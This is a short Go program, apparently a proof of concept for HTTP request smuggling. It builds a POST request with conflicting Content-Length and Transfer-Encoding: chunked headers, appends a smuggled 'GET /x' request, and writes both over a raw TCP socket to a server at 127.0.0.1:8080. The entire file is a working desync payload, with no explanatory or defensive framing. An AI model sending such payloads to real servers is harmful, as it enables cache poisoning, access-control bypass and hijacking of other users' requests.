package main
import "net"
const a = "POST / HTTP/1.1\r\nHost: t\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
const b = "GET /x HTTP/1.1\r\nHost: t\r\n\r\n"
func main() { c, e := net.Dial("tcp", "127.0.0.1:8080"); if e == nil { _, _ = c.Write([]byte(a+b)); c.Close() } }
